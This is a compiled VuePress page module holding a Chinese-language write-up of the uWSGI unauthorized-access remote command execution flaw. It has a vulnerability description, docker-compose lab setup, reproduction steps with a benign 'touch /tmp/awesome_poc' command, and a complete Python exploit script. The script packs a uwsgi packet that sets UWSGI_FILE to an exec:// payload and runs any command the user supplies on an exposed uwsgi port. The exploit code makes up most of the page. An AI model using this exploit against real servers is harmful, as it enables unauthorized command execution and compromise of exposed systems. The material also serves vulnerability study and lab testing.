import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言，通常被用于运行Python WEB应用。uwsgi除了是应用容器的名称之外，它和Fastcgi之类的一样，也是前端server与后端应用容器之间的一个交流标准。目前nginx，apache也支持uwsgi协议进行代理转发请求。",-1),k=n("p",null,[s("uWSGI支持通过魔术变量（Magic Variables）的方式动态配置后端Web应用。如果其端口暴露在外，攻击者可以构造uwsgi数据包，并指定魔术变量"),n("code",null,"UWSGI_FILE"),s("，运用"),n("code",null,"exec://"),s("协议执行任意命令。")],-1),d=n("p",null,"参考链接：",-1),v={href:"https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md",target:"_blank",rel:"noopener noreferrer"},m={href:"https://xz.aliyun.com/t/3512",target:"_blank",rel:"noopener noreferrer"},b={href:"https://uwsgi-docs.readthedocs.io/en/latest/Vars.html",target:"_blank",rel:"noopener noreferrer"},g=p(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动nginx+uwsgi环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看一个Web应用，其uwsgi暴露在8000端口。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,5),h={href:"https://github.com/vulhub/vulhub/blob/master/uwsgi/unacc/poc.py",target:"_blank",rel:"noopener noreferrer"},_=n("code",null,'python poc.py -u your-ip:8000 -c "touch /tmp/awesome_poc"',-1),w=p(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021637238.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行<code>docker-compose exec web bash</code>进入容器，可见<code>/tmp/awesome_poc</code>已经成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021638121.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>
<span class="token comment"># coding: utf-8</span>
<span class="token comment">######################</span>
<span class="token comment"># Uwsgi RCE Exploit</span>
<span class="token comment">######################</span>
<span class="token comment"># Author: wofeiwo@80sec.com</span>
<span class="token comment"># Created: 2017-7-18</span>
<span class="token comment"># Last modified: 2018-1-30</span>
<span class="token comment"># Note: Just for research purpose</span>

<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> requests

<span class="token keyword">def</span> <span class="token function">sz</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>x <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">&#39;0&#39;</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token keyword">else</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">pack_uwsgi_vars</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token punctuation">:</span>
    pk <span class="token operator">=</span> <span class="token string">b&#39;&#39;</span>
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> var<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> <span class="token string">&#39;items&#39;</span><span class="token punctuation">)</span> <span class="token keyword">else</span> var<span class="token punctuation">:</span>
        pk <span class="token operator">+=</span> sz<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf8&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> sz<span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">+</span> v<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf8&#39;</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token string">b&#39;\\x00&#39;</span> <span class="token operator">+</span> sz<span class="token punctuation">(</span>pk<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b&#39;\\x00&#39;</span> <span class="token operator">+</span> pk
    <span class="token keyword">return</span> result


<span class="token keyword">def</span> <span class="token function">parse_addr</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> default_port<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    port <span class="token operator">=</span> default_port
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> addr<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            addr<span class="token punctuation">,</span> port <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span> addr
        <span class="token keyword">elif</span> <span class="token string">&#39;:&#39;</span> <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
            addr<span class="token punctuation">,</span> _<span class="token punctuation">,</span> port <span class="token operator">=</span> addr<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">&#39;:&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        addr<span class="token punctuation">,</span> port <span class="token operator">=</span> addr
    port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token keyword">if</span> port <span class="token keyword">else</span> port
    <span class="token keyword">return</span> <span class="token punctuation">(</span>addr <span class="token keyword">or</span> <span class="token string">&#39;127.0.0.1&#39;</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_host_from_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">&#39;//&#39;</span> <span class="token keyword">in</span> url<span class="token punctuation">:</span>
        url <span class="token operator">=</span> url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;//&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    host<span class="token punctuation">,</span> _<span class="token punctuation">,</span> url <span class="token operator">=</span> url<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token string">&#39;/&#39;</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">fetch_data</span><span class="token punctuation">(</span>uri<span class="token punctuation">,</span> payload<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">&#39;http&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> uri<span class="token punctuation">:</span>
        uri <span class="token operator">=</span> <span class="token string">&#39;http://&#39;</span> <span class="token operator">+</span> uri
    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># s.headers[&#39;UWSGI_FILE&#39;] = payload</span>
    <span class="token keyword">if</span> body<span class="token punctuation">:</span>
        <span class="token keyword">import</span> urlparse
        body_d <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>urlparse<span class="token punctuation">.</span>parse_qsl<span class="token punctuation">(</span>urlparse<span class="token punctuation">.</span>urlsplit<span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>
        d <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>uri<span class="token punctuation">,</span> data<span class="token operator">=</span>body_d<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uri<span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;code&#39;</span><span class="token punctuation">:</span> d<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span>
        <span class="token string">&#39;text&#39;</span><span class="token punctuation">:</span> d<span class="token punctuation">.</span>text<span class="token punctuation">,</span>
        <span class="token string">&#39;header&#39;</span><span class="token punctuation">:</span> d<span class="token punctuation">.</span>headers
    <span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">ask_uwsgi</span><span class="token punctuation">(</span>addr_and_port<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> var<span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">&#39;tcp&#39;</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>parse_addr<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">&#39;unix&#39;</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_UNIX<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pack_uwsgi_vars<span class="token punctuation">(</span>var<span class="token punctuation">)</span> <span class="token operator">+</span> body<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    response <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token comment"># Actually we dont need the response, it will block if we run any commands.</span>
    <span class="token comment"># So I comment all the receiving stuff. </span>
    <span class="token comment"># while 1:</span>
    <span class="token comment">#     data = s.recv(4096)</span>
    <span class="token comment">#     if not data:</span>
    <span class="token comment">#         break</span>
    <span class="token comment">#     response.append(data)</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">b&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf8&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">curl</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> addr_and_port<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    host<span class="token punctuation">,</span> uri <span class="token operator">=</span> get_host_from_url<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    path<span class="token punctuation">,</span> _<span class="token punctuation">,</span> qs <span class="token operator">=</span> uri<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">&#39;?&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token string">&#39;http&#39;</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> fetch_data<span class="token punctuation">(</span>addr_and_port<span class="token operator">+</span>uri<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token string">&#39;tcp&#39;</span><span class="token punctuation">:</span>
        host <span class="token operator">=</span> host <span class="token keyword">or</span> parse_addr<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        host <span class="token operator">=</span> addr_and_port
    var <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;SERVER_PROTOCOL&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;HTTP/1.1&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;REQUEST_METHOD&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;PATH_INFO&#39;</span><span class="token punctuation">:</span> path<span class="token punctuation">,</span>
        <span class="token string">&#39;REQUEST_URI&#39;</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>
        <span class="token string">&#39;QUERY_STRING&#39;</span><span class="token punctuation">:</span> qs<span class="token punctuation">,</span>
        <span class="token string">&#39;SERVER_NAME&#39;</span><span class="token punctuation">:</span> host<span class="token punctuation">,</span>
        <span class="token string">&#39;HTTP_HOST&#39;</span><span class="token punctuation">:</span> host<span class="token punctuation">,</span>
        <span class="token string">&#39;UWSGI_FILE&#39;</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
        <span class="token string">&#39;SCRIPT_NAME&#39;</span><span class="token punctuation">:</span> target_url
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> ask_uwsgi<span class="token punctuation">(</span>addr_and_port<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> var<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    desc <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
    This is a uwsgi client &amp; RCE exploit.
    Last modifid at 2018-01-30 by wofeiwo@80sec.com
    &quot;&quot;&quot;</span>
    elog <span class="token operator">=</span> <span class="token string">&quot;Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \\&quot;echo 111&gt;/tmp/abc\\&quot;&quot;</span>
    
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span>desc<span class="token punctuation">,</span> epilog<span class="token operator">=</span>elog<span class="token punctuation">)</span>

    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-m&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--mode&#39;</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token string">&#39;?&#39;</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">&#39;tcp&#39;</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.&#39;</span><span class="token punctuation">,</span>
                        dest<span class="token operator">=</span><span class="token string">&#39;mode&#39;</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;tcp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;unix&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--uwsgi&#39;</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token string">&#39;?&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock&#39;</span><span class="token punctuation">,</span>
                        dest<span class="token operator">=</span><span class="token string">&#39;uwsgi_addr&#39;</span><span class="token punctuation">)</span>

    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-c&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--command&#39;</span><span class="token punctuation">,</span> nargs<span class="token operator">=</span><span class="token string">&#39;?&#39;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                        <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;Command: The exploit command you want to execute, must have this.&#39;</span><span class="token punctuation">,</span>
                        dest<span class="token operator">=</span><span class="token string">&#39;command&#39;</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
        parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> args<span class="token punctuation">.</span>mode<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;http&quot;</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-]Currently only tcp/unix method is supported in RCE exploit.&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    payload <span class="token operator">=</span> <span class="token string">&#39;exec://&#39;</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>command <span class="token operator">+</span> <span class="token string">&quot;; echo test&quot;</span> <span class="token comment"># must have someting in output or the uWSGI crashs.</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[*]Sending payload.&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>curl<span class="token punctuation">(</span>args<span class="token punctuation">.</span>mode<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>uwsgi_addr<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token string">&#39;/testapp&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5);function y(f,x){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,r,k,d,n("ul",null,[n("li",null,[n("a",v,[s("https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md"),t(a)])]),n("li",null,[n("a",m,[s("https://xz.aliyun.com/t/3512"),t(a)])]),n("li",null,[n("a",b,[s("https://uwsgi-docs.readthedocs.io/en/latest/Vars.html"),t(a)])])]),g,n("p",null,[s("使用"),n("a",h,[s("poc.py"),t(a)]),s("，执行命令"),_,s("：")]),w])}const S=e(l,[["render",y],["__file","uWSGI 未授权访问漏洞.html.vue"]]);export{S as default};
